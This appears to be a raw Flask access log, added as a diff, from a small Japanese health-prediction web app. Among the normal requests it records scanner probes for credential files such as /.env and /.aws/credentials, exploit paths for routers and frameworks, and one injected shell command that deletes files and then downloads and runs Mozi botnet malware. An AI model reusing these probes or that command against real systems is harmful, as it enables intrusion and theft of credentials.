+https://scikit-learn.org/stable/modules/model_persistence.html#security-maintainability-limitations
+  UserWarning,
+/home/ec2-user/myenv/lib64/python3.7/site-packages/sklearn/base.py:338: UserWarning: Trying to unpickle estimator RandomForestClassifier from version 0.24.2 when using version 1.0.2. This might lead to breaking code or invalid results. Use at your own risk. For more info please refer to:
+https://scikit-learn.org/stable/modules/model_persistence.html#security-maintainability-limitations
+  UserWarning,
+127.0.0.1 - - [14/Dec/2022 12:00:49] "[32mPOST /firstIndex/10/2022年12月14日%2020:59:57/22/0/5/0/1.6666666666666679/7.0/0.16666666666666666/0.0/1.0/0.5/2.3333333333333335/result HTTP/1.1[0m" 302 -
+127.0.0.1 - - [14/Dec/2022 12:00:49] "GET /result/0.0/0.0/1.0/0.6666666666666666/0.0/2/体調が維持されるでしょう/10/2022年12月14日%2020:59:57/22/0/5/0/7.0/1.6666666666666679/0.16666666666666666/0.0/1.0/0.5/2.3333333333333335 HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 12:00:49] "GET /templates/image/neutral.png HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 12:00:52] "GET /end/0.0/0.0/1.0/0.6666666666666666/0.0/2/体調が維持されるでしょう/10/2022年12月14日%2020:59:57/22/0/5/0/7.0/1.6666666666666679/0.16666666666666666/0.0/1.0/0.5/2.3333333333333335 HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 12:00:52] "[36mGET /templates/image/neutral.png HTTP/1.1[0m" 304 -
+127.0.0.1 - - [14/Dec/2022 12:36:01] "GET /end/0.0/0.0/0.3333333333333333/0.0/6.333333333333333/1/体調が悪くなるでしょう/9/2022年12月14日%2020:31:41/3/0/9/0/6.0/6.666666666666668/0.0/0.0/0.5/0.3333333333333333/6.0 HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 12:36:01] "GET /templates/image/sad.png HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 12:37:50] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 12:44:27] "OPTIONS / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 12:52:59] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 12:53:00] "POST / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 13:08:02] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 13:08:03] "POST / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 13:37:33] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 13:37:34] "POST / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 13:55:42] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 13:55:43] "POST / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 14:08:10] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 14:11:11] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 14:25:34] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 14:36:39] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 14:36:40] "POST / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 14:55:33] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 15:14:20] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 15:14:20] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 15:14:21] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 15:14:21] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 15:14:53] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 15:14:54] "POST / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 15:22:02] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 15:23:27] "[32mPOST / HTTP/1.1[0m" 302 -
+127.0.0.1 - - [14/Dec/2022 15:23:27] "GET /firstIndex/2/2022年12月15日%2000:23:27/1/0/8/20/25.0/7.333333333333334/9.0/0.0/0.5/0.25/5.0/1 HTTP/1.1" 200 -
+/home/ec2-user/myenv/lib64/python3.7/site-packages/sklearn/base.py:338: UserWarning: Trying to unpickle estimator DecisionTreeClassifier from version 0.24.2 when using version 1.0.2. This might lead to breaking code or invalid results. Use at your own risk. For more info please refer to:
+https://scikit-learn.org/stable/modules/model_persistence.html#security-maintainability-limitations
+  UserWarning,
+/home/ec2-user/myenv/lib64/python3.7/site-packages/sklearn/base.py:338: UserWarning: Trying to unpickle estimator RandomForestClassifier from version 0.24.2 when using version 1.0.2. This might lead to breaking code or invalid results. Use at your own risk. For more info please refer to:
+https://scikit-learn.org/stable/modules/model_persistence.html#security-maintainability-limitations
+  UserWarning,
+127.0.0.1 - - [14/Dec/2022 15:24:07] "[32mPOST /firstIndex/2/2022年12月15日%2000:23:27/1/0/8/20/25.0/7.333333333333334/9.0/0.0/0.5/0.25/5.0/result HTTP/1.1[0m" 302 -
+127.0.0.1 - - [14/Dec/2022 15:24:08] "GET /result/9.0/0.0/2.0/0.0/1.0/2/体調が維持されるでしょう/2/2022年12月15日%2000:23:27/1/0/8/20/7.333333333333334/25.0/9.0/0.0/0.5/0.25/5.0 HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 15:24:08] "[36mGET /templates/image/neutral.png HTTP/1.1[0m" 304 -
+127.0.0.1 - - [14/Dec/2022 15:24:11] "GET /end/9.0/0.0/2.0/0.0/1.0/2/体調が維持されるでしょう/2/2022年12月15日%2000:23:27/1/0/8/20/7.333333333333334/25.0/9.0/0.0/0.5/0.25/5.0 HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 15:24:11] "[36mGET /templates/image/neutral.png HTTP/1.1[0m" 304 -
+167.172.35.18 - - [14/Dec/2022 15:25:23] code 400, message Bad request version ('À\x14À')
+167.172.35.18 - - [14/Dec/2022 15:25:23] "[35m[1m {  wÍËC¤á*"^¿è%TÞì­áØ0$j8ÛGìý  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+167.172.35.18 - - [14/Dec/2022 15:25:23] code 400, message Bad request version ('À\x14À')
+167.172.35.18 - - [14/Dec/2022 15:25:23] "[35m[1m {  w­'ên°1	âý7{`ñ¡ÔÓ&ÛõØòîÒÙ  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+167.172.35.18 - - [14/Dec/2022 15:25:24] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 15:27:13] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 15:37:21] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 15:45:27] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 16:05:07] "GET /end/0.0/0.0/0.3333333333333333/0.0/6.333333333333333/1/体調が悪くなるでしょう/9/2022年12月14日%2020:31:41/3/0/9/0/6.0/6.666666666666668/0.0/0.0/0.5/0.3333333333333333/6.0 HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 16:05:07] "GET /templates/image/sad.png HTTP/1.1" 200 -
+192.241.210.57 - - [14/Dec/2022 16:13:17] code 400, message Bad request version ('À\x14À')
+192.241.210.57 - - [14/Dec/2022 16:13:17] "[35m[1m {  wÜ·¢n£_ç£&LG²JæIy·/NÆÛ  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [14/Dec/2022 16:19:38] "[33mGET /echo.php HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 16:29:14] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 16:35:20] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 16:37:28] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 16:37:29] "POST / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 16:39:35] "[33mGET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 17:03:53] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 17:26:01] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 17:26:03] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 17:47:30] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 17:47:31] "POST / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 17:50:11] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 17:50:12] "POST / HTTP/1.1" 200 -
+192.241.203.211 - - [14/Dec/2022 17:50:36] code 400, message Bad request version ('À#À¬À®À+À')
+192.241.203.211 - - [14/Dec/2022 17:50:36] "[35m[1m¦ ¢¿½ª=Ð<ÑZëÖÑjñÿÕÿRKÚª?NpP@ í5vL5¦#>¨½A4Úò»nùTcåÒoé Àñ³£   3 gÀÀ¢  9 kÀÀ£  E ¾  Ä ÀÀ	À#À¬À®À+À[0m" HTTPStatus.BAD_REQUEST -
+192.241.203.211 - - [14/Dec/2022 17:50:36] code 400, message Bad request version ('[¸\x93õb6áb')
+192.241.203.211 - - [14/Dec/2022 17:50:36] "[35m[1m¦ ¢Üì´lí&ë§üjÞÌ{¡áÅo3øÌBT.Í¡ [¸õb6áb[0m" HTTPStatus.BAD_REQUEST -
+192.241.203.211 - - [14/Dec/2022 17:50:36] code 400, message Bad request version ('\x97\x13\x94ü\x00FÀ\x12À\x07Ì\x14\x13\x01\x13\x02Ì©ÀsÀrÀ,À¯À\xadÀ$À')
+192.241.203.211 - - [14/Dec/2022 17:50:36] "[35m[1mW S¸.^ØVëÒt@p·ë§ÓÒvq¼áºá Ð@`eûÂ ­å"o^gd©¤âáS@Þü FÀÀÌÌ©ÀsÀrÀ,À¯À­À$À[0m" HTTPStatus.BAD_REQUEST -
+192.241.203.211 - - [14/Dec/2022 17:50:37] code 400, message Bad request syntax ('\x16\x03\x03\x01I\x01\x00\x01E\x03\x03/¥>Á')
+192.241.203.211 - - [14/Dec/2022 17:50:37] "[35m[1mI E/¥>Á[0m" HTTPStatus.BAD_REQUEST -
+192.241.203.211 - - [14/Dec/2022 17:50:37] code 400, message Bad request version ("\x04z\x00\x8cÚÚÀ\x12À\x13À\x07À'Ì\x14À/\x13\x01À\x14\x13\x02À(Ì©À0ÀsÀ`ÀrÀaÀ,ÀvÀ¯ÀwÀ\xadÌ¨À$\x13\x05À")
+192.241.203.211 - - [14/Dec/2022 17:50:37] "[35m[1m ¥ÿSz²81·ÐnoÎÅÐ"òÇW»Ø¥ ¼ç÷BOOcÔ1G·°m¸Ó´¶ØtW©ðáz ÚÚÀÀÀÀ'ÌÀ/ÀÀ(Ì©À0ÀsÀ`ÀrÀaÀ,ÀvÀ¯ÀwÀ­Ì¨À$À[0m" HTTPStatus.BAD_REQUEST -
+192.241.203.211 - - [14/Dec/2022 17:50:37] code 400, message Bad request version ('À#À¬À®À+À')
+192.241.203.211 - - [14/Dec/2022 17:50:37] "[35m[1m ÕG¤å'#Â»×Ãm´îMï©<á{~RÁQä [1Ê­ß·ö¸;¼VX½ýiü¾ÐÀÆ*)Ò   3 gÀÀ¢  9 kÀÀ£  E ¾  Ä ÀÀ	À#À¬À®À+À[0m" HTTPStatus.BAD_REQUEST -
+192.241.203.211 - - [14/Dec/2022 17:50:37] code 400, message Bad request version ('À#À¬À®À+À')
+192.241.203.211 - - [14/Dec/2022 17:50:37] "[35m[1m¨ ¤3Á5ÉhWKÉwÉN&JÂ¯%æ+ ðM¹h0 ¾D¤ôýIàPdÊ=LÂ[2=[å¸U?q\LùÞ!i   3 gÀÀ¢  9 kÀÀ£  E ¾  Ä ÀÀ	À#À¬À®À+À[0m" HTTPStatus.BAD_REQUEST -
+192.241.203.211 - - [14/Dec/2022 17:50:38] code 400, message Bad request version ('À\x9c\x00<\x00/\x00')
+192.241.203.211 - - [14/Dec/2022 17:50:38] "[35m[1m¨ ¤+Þp'g2m2q³&%WA¸ÞQ07BçJ/ ÜÎÊoéG¼ò÷X=~Íò7û©«Ö{^^¿:U     À  º A À¡À = 5 À À < / [0m" HTTPStatus.BAD_REQUEST -
+192.241.203.211 - - [14/Dec/2022 17:50:38] code 400, message Bad request version ('À#À¬À®À+À')
+192.241.203.211 - - [14/Dec/2022 17:50:38] "[35m[1m eB=lAÖ]¡®q'ûm|d7Gc5)þÜ}f÷F´ / =Î1&Jò®ÚfÖ*Ìj&1|Ògõ^ø£   3 gÀÀ¢  9 kÀÀ£  E ¾  Ä ÀÀ	À#À¬À®À+À[0m" HTTPStatus.BAD_REQUEST -
+192.241.203.211 - - [14/Dec/2022 17:50:38] code 400, message Bad request version ('Fç')
+192.241.203.211 - - [14/Dec/2022 17:50:38] "[35m[1mµ ±àØùàt:Ò@GM«±AÝþC5:ÈÐFØZ Fç[0m" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [14/Dec/2022 18:06:52] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 18:15:57] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 18:16:56] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 18:16:56] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+43.129.39.176 - - [14/Dec/2022 18:51:48] "GET / HTTP/1.1" 200 -
+205.185.116.89 - - [14/Dec/2022 18:51:58] "GET / HTTP/1.1" 200 -
+205.185.116.25 - - [14/Dec/2022 18:51:59] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+198.235.24.28 - - [14/Dec/2022 18:55:23] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 19:29:06] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 19:30:13] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 19:30:14] "POST / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 19:35:21] "[33mGET /firstindex/0/2022年12月13日%2008:20:58/0/10/0/10/16.033333333333335/0.0/8.0/0.0/0.5/0.0/2.0/result HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 19:43:21] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 19:43:21] "POST / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 19:59:48] "[33mGET /status HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 20:01:06] "[33mGET /_ignition/execute-solution HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 20:28:07] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 20:30:04] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 20:46:31] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 20:46:31] "POST / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 20:56:02] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 21:09:04] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 21:09:08] "POST / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 21:47:49] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 22:47:50] "[33mGET /actuator/gateway/routes HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 23:01:15] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 23:01:16] "POST / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 23:21:21] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 23:21:21] "OPTIONS / HTTP/1.1" 200 -
+Traceback (most recent call last):
+  File "/home/ec2-user/myenv/lib64/python3.7/site-packages/flask/app.py", line 2548, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/home/ec2-user/myenv/lib64/python3.7/site-packages/flask/app.py", line 2528, in wsgi_app
+    response = self.handle_exception(e)
+  File "/home/ec2-user/myenv/lib64/python3.7/site-packages/flask/app.py", line 2525, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/ec2-user/myenv/lib64/python3.7/site-packages/flask/app.py", line 1823, in full_dispatch_request
+    return self.finalize_request(rv)
+  File "/home/ec2-user/myenv/lib64/python3.7/site-packages/flask/app.py", line 1842, in finalize_request
+    response = self.make_response(rv)
+  File "/home/ec2-user/myenv/lib64/python3.7/site-packages/flask/app.py", line 2135, in make_response
+    f"The view function for {request.endpoint!r} did not"
+TypeError: The view function for 'root' did not return a valid response. The function either returned None or ended without a return statement.
+127.0.0.1 - - [14/Dec/2022 23:23:11] "[35m[1mHEAD / HTTP/1.1[0m" 500 -
+127.0.0.1 - - [14/Dec/2022 23:23:11] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 23:23:11] "[33mGET /nmaplowercheck1671060190 HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 23:23:12] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 23:23:12] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 23:23:12] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 23:23:12] "[33mGET /evox/about HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 23:23:12] "[33mGET /HNAP1 HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 23:23:12] "[33mPOST /sdk HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 23:35:45] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [14/Dec/2022 23:35:45] "POST / HTTP/1.1" 200 -
+127.0.0.1 - - [14/Dec/2022 23:55:23] "[33mHEAD /Core/Skin/Login.aspx HTTP/1.1[0m" 404 -
+127.0.0.1 - - [15/Dec/2022 00:04:24] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [15/Dec/2022 00:04:25] "POST / HTTP/1.1" 200 -
+198.235.24.146 - - [15/Dec/2022 00:13:10] code 400, message Bad request version ('À(À$À\x14À')
+198.235.24.146 - - [15/Dec/2022 00:13:10] "[35m[1m Ê  Æ¼¸þUä_H´ìSùÄ|óæå·PP½ûý  hÌÌÀ/À+À0À,ÀÀÀ'À#ÀÀ	À(À$ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+192.241.201.166 - - [15/Dec/2022 00:42:05] code 400, message Bad request syntax ('MGLNDD_35.79.179.181_8888')
+192.241.201.166 - - [15/Dec/2022 00:42:05] "[35m[1mMGLNDD_35.79.179.181_8888[0m" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [15/Dec/2022 00:42:19] "GET /end/0.0/0.0/0.3333333333333333/0.0/6.333333333333333/1/体調が悪くなるでしょう/9/2022年12月14日%2020:31:41/3/0/9/0/6.0/6.666666666666668/0.0/0.0/0.5/0.3333333333333333/6.0 HTTP/1.1" 200 -
+127.0.0.1 - - [15/Dec/2022 00:42:19] "GET /templates/image/sad.png HTTP/1.1" 200 -
+127.0.0.1 - - [15/Dec/2022 00:49:17] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [15/Dec/2022 00:49:18] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+94.102.61.20 - - [15/Dec/2022 00:56:17] code 400, message Bad request version ('À\x14À')
+94.102.61.20 - - [15/Dec/2022 00:56:17] "[35m[1m   $£Û`óÌ^m.ÛLªa¯þ·£=aLQímk  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [15/Dec/2022 01:19:39] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [15/Dec/2022 01:19:40] "POST / HTTP/1.1" 200 -
+167.94.138.44 - - [15/Dec/2022 01:23:05] code 400, message Bad request version ('À\x14À')
+167.94.138.44 - - [15/Dec/2022 01:23:05] "[35m[1m î  êâÞNAH¶í°?jºHaÓÐ¡:³\¥JÊ ý/C^îfo×ÏÕÂÕÉ6`;¢rYGÂè &Ì¨Ì©À/À0À+À,ÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+167.94.138.44 - - [15/Dec/2022 01:23:06] "GET / HTTP/1.1" 200 -
+167.94.138.44 - - [15/Dec/2022 01:23:07] "GET / HTTP/1.1" 200 -
+167.94.138.44 - - [15/Dec/2022 01:23:07] code 505, message Invalid HTTP version (2.0)
+167.94.138.44 - - [15/Dec/2022 01:23:07] "[35m[1mPRI * HTTP/2.0[0m" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+167.94.138.44 - - [15/Dec/2022 01:23:07] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+127.0.0.1 - - [15/Dec/2022 01:26:54] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [15/Dec/2022 01:26:54] "POST / HTTP/1.1" 200 -
+127.0.0.1 - - [15/Dec/2022 01:26:56] "[33mGET /_profiler/phpinfo HTTP/1.1[0m" 404 -
+127.0.0.1 - - [15/Dec/2022 01:26:58] "[33mGET /phpinfo.php HTTP/1.1[0m" 404 -
+127.0.0.1 - - [15/Dec/2022 01:26:59] "[33mGET /phpinfo HTTP/1.1[0m" 404 -
+127.0.0.1 - - [15/Dec/2022 01:26:59] "[33mGET /aws.yml HTTP/1.1[0m" 404 -
+127.0.0.1 - - [15/Dec/2022 01:27:02] "[33mGET /.env.bak HTTP/1.1[0m" 404 -
+127.0.0.1 - - [15/Dec/2022 01:27:03] "[33mGET /info.php HTTP/1.1[0m" 404 -
+127.0.0.1 - - [15/Dec/2022 01:27:04] "[33mGET /.aws/credentials HTTP/1.1[0m" 404 -
+127.0.0.1 - - [15/Dec/2022 01:27:05] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [15/Dec/2022 01:27:07] "[33mGET /config/aws.yml HTTP/1.1[0m" 404 -
+127.0.0.1 - - [15/Dec/2022 01:27:08] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [15/Dec/2022 01:27:09] "[33mGET /config.js HTTP/1.1[0m" 404 -
+127.0.0.1 - - [15/Dec/2022 01:41:38] "[33mGET /.env HTTP/1.1[0m" 404 -
+127.0.0.1 - - [15/Dec/2022 01:41:39] "POST / HTTP/1.1" 200 -
